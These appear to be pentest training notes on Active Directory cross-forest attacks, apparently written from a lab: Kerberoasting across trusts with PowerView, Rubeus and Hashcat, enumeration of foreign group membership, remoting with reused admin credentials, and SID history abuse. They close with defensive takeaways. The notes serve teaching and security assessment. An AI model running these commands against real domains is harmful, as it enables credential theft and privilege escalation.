**I. Cross-Forest Kerberoasting**

**Concept:** Leveraging Kerberoasting across domain trusts to extract and crack credentials from accounts in other domains.

**Steps:**

1. **Enumerate SPNs:**
    - Use PowerView to list Service Principal Names (SPNs):
        
        ```powershell
        Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
        ```
        
2. **Verify Account Privileges:**
    - Check if the target account has privileged group memberships:
        
        ```powershell
        Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
        ```
        
3. **Perform Kerberoasting:**
    - Request and extract service tickets for cracking:
        
        ```powershell
        .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
        ```
        
4. **Crack the Hash:**
    - Use Hashcat (mode 13100) to crack the extracted ticket hash.

**Key Takeaways:**

- Cross-forest Kerberoasting exploits domain trust relationships.
- Privileged accounts with SPNs can be targeted for credential extraction.

**II. Admin Password Reuse & Group Membership**

**Password Reuse:**

- Evaluating password reuse across trusted domains with bidirectional trusts.
- If an attacker compromises credentials in one domain, they may gain access to another.

**Group Membership Enumeration:**

- Identifying cross-domain privileges through foreign group memberships.

**Commands:**

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

**Verifying Access:**

- Test access using PowerShell remoting:

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

**Key Takeaways:**

- Weak password policies and reused credentials increase risk.
- Identifying privileged accounts across domains is crucial for security assessments.

**III. SID History Abuse in Cross-Forest Attacks**

**Concept:**

- Exploiting SID history in inter-forest trusts when SID filtering is not enforced.
- Migrated accounts can retain privileges from their original domain.

**Mechanism:**

- Injecting SIDs from one forest into the `sidHistory` attribute of accounts in another.
- The modified account inherits the permissions associated with the added SID.

**Key Takeaways:**

- Misconfigurations in trust relationships can lead to privilege escalation.
- Proper SID filtering must be enabled to prevent unauthorized privilege retention.

---

**IV. Security Considerations:**

- Cross-forest attacks significantly expand an attackerâ€™s ability to escalate privileges.
- Continuous monitoring and auditing of trust relationships are essential.
- Enforcing strong password policies and SID filtering can mitigate risk.
- Properly securing privileged accounts with limited SPN exposure reduces attack surface.
